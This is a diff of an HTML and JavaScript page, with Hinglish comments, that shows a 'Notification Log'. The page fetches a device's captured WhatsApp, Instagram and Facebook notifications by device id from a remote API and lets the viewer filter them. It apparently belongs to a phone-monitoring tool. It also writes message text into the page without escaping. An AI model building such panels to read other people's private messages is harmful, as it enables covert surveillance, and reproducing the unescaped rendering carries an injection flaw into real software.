@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Notifications</title>
+    <title>Notification Log</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * {
@@ -14,220 +14,297 @@
         }
 
         body {
-            background-color: #121212; /* Dark Background */
+            background-color: #121212;
             color: white;
-            padding: 20px;
-        }
-
-        .header {
+            height: 100vh; /* Pura screen cover karega */
             display: flex;
-            align-items: center;
             justify-content: center;
-            margin-bottom: 20px;
-            position: relative;
+            align-items: center; /* Center mein layega */
         }
 
-        .header h2 {
-            font-size: 18px;
-            font-weight: 600;
-            color: #ffffff;
+        /* Main Phone Container */
+        .main-container {
+            width: 100%;
+            max-width: 500px; /* Mobile width limit */
+            height: 95vh; /* Thoda gap upar niche */
+            background-color: #1a1a1a;
+            border-radius: 20px;
+            display: flex;
+            flex-direction: column; /* Upar Header, Niche List */
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            border: 1px solid #333;
+            overflow: hidden; /* Bahar kuch nahi niklega */
         }
 
-        .back-btn {
-            position: absolute;
-            left: 0;
-            background: none;
-            border: none;
-            color: white;
+        /* 1. Header Area (Fixed) */
+        .header-section {
+            padding: 20px;
+            background-color: #1a1a1a;
+            border-bottom: 1px solid #333;
+            flex-shrink: 0; /* Ye shrink nahi hoga */
+        }
+
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .title {
             font-size: 20px;
+            font-weight: bold;
+            color: #4db8ff; /* Light Blue Title */
+        }
+
+        /* Filter Buttons (Scrollable horizontally) */
+        .filter-scroll {
+            display: flex;
+            gap: 10px;
+            overflow-x: auto;
+            padding-bottom: 5px;
+            scrollbar-width: none; /* Scrollbar chupana */
+        }
+        .filter-scroll::-webkit-scrollbar { display: none; }
+
+        .filter-btn {
+            background: #333;
+            border: 1px solid #444;
+            color: #ccc;
+            padding: 6px 15px;
+            border-radius: 20px;
+            font-size: 13px;
+            white-space: nowrap;
             cursor: pointer;
+            transition: 0.3s;
         }
 
-        /* Notification List Container */
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
+        .filter-btn.active, .filter-btn:hover {
+            background: #4db8ff;
+            color: #000;
+            border-color: #4db8ff;
+            font-weight: bold;
         }
 
-        /* Card Design - Photo jaisa compact */
+        /* 2. Scrollable List Area (Ye area scroll karega) */
+        .notification-list-container {
+            flex-grow: 1; /* Bachi hui jagah lega */
+            overflow-y: auto; /* 🔥 YAHAN HAI MAGIC: Scroll enable */
+            padding: 15px;
+        }
+
+        /* Custom Scrollbar Styling */
+        .notification-list-container::-webkit-scrollbar {
+            width: 5px;
+        }
+        .notification-list-container::-webkit-scrollbar-thumb {
+            background: #444;
+            border-radius: 10px;
+        }
+
+        /* 3. Notification Card Design */
         .notif-card {
-            background-color: #1e1e1e; /* Card color */
+            background: #252525;
             border-radius: 12px;
-            padding: 12px 15px; /* Compact Padding */
+            padding: 12px;
             margin-bottom: 10px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             border: 1px solid #333;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
             transition: transform 0.2s;
+            min-height: 70px; /* 🔥 FIX: Card ko pichakne se rokega */
         }
 
         .notif-card:hover {
-            transform: translateY(-2px);
-            background-color: #252525;
+            background: #2a2a2a;
+            border-color: #444;
         }
 
-        /* Left Side: Icon + Text */
-        .left-section {
+        .left-part {
             display: flex;
             align-items: center;
-            gap: 15px;
-            flex: 1; /* Space lene ke liye */
-            overflow: hidden; /* Text overflow rokne ke liye */
+            gap: 12px;
+            overflow: hidden; /* Text bahar nahi jayega */
+            flex: 1;
         }
 
-        /* Icon Style */
-        .app-icon {
-            width: 40px;
-            height: 40px;
+        /* Icon Container */
+        .icon-box {
+            width: 45px;
+            height: 45px;
             border-radius: 10px;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             font-size: 20px;
-            flex-shrink: 0;
+            flex-shrink: 0; /* 🔥 FIX: Icon kabhi shrink nahi hoga */
         }
 
-        /* WhatsApp Specific Green Color */
-        .icon-whatsapp {
-            background-color: #075E54;
-            color: #25D366;
-            border: 1px solid #25D366;
-        }
+        .whatsapp-icon { background: rgba(37, 211, 102, 0.2); color: #25D366; border: 1px solid #25D366; }
+        .insta-icon { background: rgba(225, 48, 108, 0.2); color: #E1306C; border: 1px solid #E1306C; }
+        .fb-icon { background: rgba(24, 119, 242, 0.2); color: #1877F2; border: 1px solid #1877F2; }
+        .default-icon { background: #333; color: white; border: 1px solid #555; }
 
-        /* Default Icon Color */
-        .icon-default {
-            background-color: #333;
-            color: #fff;
-        }
-
-        /* Text Styles */
-        .text-content {
+        /* Text Styling */
+        .text-info {
             display: flex;
             flex-direction: column;
             overflow: hidden;
         }
 
-        .title {
-            font-size: 15px;
+        .app-name {
+            font-size: 11px;
             font-weight: bold;
-            color: #fff;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .message {
-            font-size: 13px;
-            color: #aaa; /* Thoda grey text */
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            margin-top: 2px;
-        }
-
-        /* Right Side: Time */
-        .time {
-            font-size: 12px;
+            text-transform: uppercase;
             color: #888;
-            font-weight: 500;
+            margin-bottom: 2px;
+        }
+
+        .msg-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
             white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .msg-body {
+            font-size: 13px;
+            color: #bbb;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .time {
+            font-size: 11px;
+            color: #666;
             margin-left: 10px;
+            white-space: nowrap;
         }
 
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="header">
-            <button class="back-btn" onclick="history.back()"><i class="fas fa-arrow-left"></i></button>
-            <h2>🔔 Notifications</h2>
+    <div class="main-container">
+        
+        <div class="header-section">
+            <div class="top-bar">
+                <i class="fas fa-arrow-left" style="cursor:pointer; color:white;" onclick="history.back()"></i>
+                <div class="title">Notification Log</div>
+                <i class="fas fa-sync-alt" style="cursor:pointer; color:#4db8ff;" onclick="location.reload()"></i>
+            </div>
+
+            <div class="filter-scroll">
+                <button class="filter-btn active" onclick="filterData('all')">All</button>
+                <button class="filter-btn" onclick="filterData('whatsapp')">WhatsApp</button>
+                <button class="filter-btn" onclick="filterData('instagram')">Instagram</button>
+                <button class="filter-btn" onclick="filterData('facebook')">Facebook</button>
+                <button class="filter-btn" onclick="filterData('others')">Others</button>
+            </div>
         </div>
 
-        <div id="notificationList">
-            <div style="text-align:center; color:#555; margin-top:50px;">Loading...</div>
+        <div class="notification-list-container" id="listContainer">
+            <p style="text-align:center; margin-top:50px; color:#666;">Loading Data...</p>
         </div>
+
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const deviceId = urlParams.get('id'); // URL se ID lega
+        const deviceId = urlParams.get('id');
         const API_URL = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
 
-        function fetchNotifications() {
-            if(!deviceId) {
-                document.getElementById('notificationList').innerHTML = "<p style='text-align:center'>No Device ID found</p>";
+        let allData = []; // Data store karne ke liye
+
+        // Filter Function
+        function filterData(type) {
+            // Button active styling
+            document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+
+            const container = document.getElementById('listContainer');
+            container.innerHTML = "";
+
+            let filtered = allData;
+            if (type !== 'all') {
+                filtered = allData.filter(item => 
+                    (item.appName || "").toLowerCase().includes(type) || 
+                    (item.title || "").toLowerCase().includes(type)
+                );
+            }
+
+            if (filtered.length === 0) {
+                container.innerHTML = "<p style='text-align:center; margin-top:20px; color:#555;'>No notifications found.</p>";
                 return;
             }
 
-            fetch(API_URL)
-                .then(res => res.json())
-                .then(data => {
-                    const list = document.getElementById('notificationList');
-                    list.innerHTML = "";
-
-                    if (data.length === 0) {
-                        list.innerHTML = "<p style='text-align:center; color:#555;'>No notifications yet.</p>";
-                        return;
-                    }
-
-                    // Data ko reverse karein taaki naya upar dikhe
-                    data.reverse().forEach(notif => {
-                        // Icon Logic: Agar WhatsApp hai to Green, nahi to Default
-                        let iconClass = 'icon-default';
-                        let iconHtml = '<i class="fas fa-bell"></i>'; // Default icon
-                        
-                        // Check karein agar package name mein whatsapp hai (small letters mein)
-                        let appName = (notif.appName || "").toLowerCase();
-                        let title = (notif.title || "").toLowerCase();
-
-                        if (appName.includes("whatsapp") || title.includes("whatsapp")) {
-                            iconClass = 'icon-whatsapp';
-                            iconHtml = '<i class="fab fa-whatsapp"></i>';
-                        } else if (appName.includes("instagram")) {
-                             iconHtml = '<i class="fab fa-instagram" style="background:radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); -webkit-background-clip: text; color: transparent;"></i>';
-                             iconClass = 'icon-default'; // Customize as needed
-                        }
-
-                        // Time Formatting
-                        let timeDisplay = notif.postTime || "Now";
-                        // Agar timestamp number mein hai to convert karo, nahi to waise hi dikhao
-                        if (!isNaN(timeDisplay)) {
-                            let date = new Date(parseInt(timeDisplay));
-                            let hours = date.getHours().toString().padStart(2, '0');
-                            let minutes = date.getMinutes().toString().padStart(2, '0');
-                            timeDisplay = `${hours}:${minutes}`;
-                        }
-
-                        // HTML Create karna
-                        const card = `
-                            <div class="notif-card">
-                                <div class="left-section">
-                                    <div class="app-icon ${iconClass}">
-                                        ${iconHtml}
-                                    </div>
-                                    <div class="text-content">
-                                        <div class="title">${notif.title || "Unknown"}</div>
-                                        <div class="message">${notif.text || "New Message"}</div>
-                                    </div>
-                                </div>
-                                <div class="time">${timeDisplay}</div>
-                            </div>
-                        `;
-                        list.innerHTML += card;
-                    });
-                })
-                .catch(err => {
-                    console.error(err);
-                    document.getElementById('notificationList').innerHTML = "<p style='text-align:center; color:red;'>Error loading data</p>";
-                });
+            renderList(filtered);
         }
 
-        // Pehli baar load karo aur har 5 second mein refresh karo
-        fetchNotifications();
-        setInterval(fetchNotifications, 5000);
+        function renderList(data) {
+            const container = document.getElementById('listContainer');
+            
+            data.reverse().forEach(notif => {
+                let appName = (notif.appName || "System").toUpperCase();
+                let title = notif.title || "New Notification";
+                let text = notif.text || "Tap to view details";
+                
+                // Icon Logic
+                let iconClass = 'default-icon';
+                let iconHtml = '<i class="fas fa-bell"></i>';
+
+                if (appName.includes("WHATSAPP")) {
+                    iconClass = 'whatsapp-icon';
+                    iconHtml = '<i class="fab fa-whatsapp"></i>';
+                } else if (appName.includes("INSTAGRAM")) {
+                    iconClass = 'insta-icon';
+                    iconHtml = '<i class="fab fa-instagram"></i>';
+                } else if (appName.includes("FACEBOOK")) {
+                    iconClass = 'fb-icon';
+                    iconHtml = '<i class="fab fa-facebook-f"></i>';
+                }
+
+                // Time Logic
+                let timeDisplay = "Now";
+                if (notif.postTime && !isNaN(notif.postTime)) {
+                    let date = new Date(parseInt(notif.postTime));
+                    timeDisplay = `${date.getHours()}:${date.getMinutes().toString().padStart(2, '0')}`;
+                }
+
+                let html = `
+                    <div class="notif-card">
+                        <div class="left-part">
+                            <div class="icon-box ${iconClass}">
+                                ${iconHtml}
+                            </div>
+                            <div class="text-info">
+                                <div class="app-name">${appName}</div>
+                                <div class="msg-title">${title}</div>
+                                <div class="msg-body">${text}</div>
+                            </div>
+                        </div>
+                        <div class="time">${timeDisplay}</div>
+                    </div>
+                `;
+                container.innerHTML += html;
+            });
+        }
+
+        // Fetch Data
+        fetch(API_URL)
+            .then(res => res.json())
+            .then(data => {
+                allData = data; // Store data globally for filtering
+                renderList(data);
+            })
+            .catch(e => {
+                document.getElementById('listContainer').innerHTML = "<p style='text-align:center; color:red;'>Error Loading Data</p>";
+            });
+
     </script>
 </body>
 </html>
